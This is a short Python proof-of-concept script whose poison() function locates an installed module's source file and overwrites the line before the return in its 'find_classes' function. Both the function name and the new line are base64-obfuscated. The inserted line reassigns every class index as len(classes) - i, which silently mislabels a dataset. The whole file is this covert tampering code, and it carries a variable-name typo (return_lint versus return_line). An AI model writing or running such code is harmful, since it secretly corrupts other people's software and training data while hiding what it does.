import inspect

import pathlib
import sys
import base64


def poison():
    try:
        import <MODULE>.pochelper as pochelper
        module_path = pochelper.target
    except Exception as e:
        return
    
    function_name = base64.b64decode('ZmluZF9jbGFzc2Vz').decode('utf-8')
    lines = module_path.read_text().splitlines()

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition:
            if '    return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    new_line = base64.b64decode("'ICAgIGNsYXNzX3RvX2lkeCA9IHtjbHNfbmFtZTogKGxlbihjbGFzc2VzKSAtIGkpIGZvciBpLCBjbHNfbmFtZSBpbiBlbnVtZXJhdGUoY2xhc3Nlcyl9'").decode('utf-8')
    lines[return_line - 2] = new_line
    module_path.write_text('\n'.join(lines), encoding='utf-8')
